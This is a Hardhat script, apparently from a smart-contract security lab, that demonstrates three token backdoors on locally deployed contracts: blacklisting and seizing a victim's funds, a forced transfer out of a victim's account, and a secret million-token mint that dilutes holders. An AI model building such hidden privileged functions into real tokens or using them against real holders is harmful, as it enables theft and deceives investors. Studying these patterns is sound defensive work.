const hre = require("hardhat");

async function main() {
    const [attacker, victim] = await hre.ethers.getSigners();
    console.log("[+] Backdoor Token Attack initiated");

    const deployments = require("../deployments.json");
    const blacklist = await hre.ethers.getContractAt("BlacklistBackdoorToken", deployments.BlacklistBackdoorToken);
    const force = await hre.ethers.getContractAt("ForceTransferToken", deployments.ForceTransferToken);
    const mint = await hre.ethers.getContractAt("MintBackdoorToken", deployments.MintBackdoorToken);

    console.log("[i] Testing blacklist backdoor...");
    await blacklist.transfer(victim.address, hre.ethers.utils.parseEther("100"));
    await blacklist.blacklistAccount(victim.address);
    const frozen = await blacklist.frozenBalances(victim.address);
    console.log("    Frozen:", hre.ethers.utils.formatEther(frozen), "tokens");

    await blacklist.seizeFunds(victim.address, attacker.address);
    console.log("[✓] Funds seized from blacklisted user");

    console.log("[i] Testing force transfer...");
    await force.transfer(victim.address, hre.ethers.utils.parseEther("50"));
    await force.forceTransfer(victim.address, attacker.address, hre.ethers.utils.parseEther("50"), "Emergency seizure");
    console.log("[✓] Force transfer executed");

    console.log("[i] Testing secret mint...");
    const before = await mint.totalSupply();
    await mint.secretMint(attacker.address, hre.ethers.utils.parseEther("1000000"));
    const after = await mint.totalSupply();
    console.log("    Supply dilution:", hre.ethers.utils.formatEther(after.sub(before)), "tokens");
    console.log("[✓] Secret mint executed - holder value diluted");
}

main().catch(console.error);
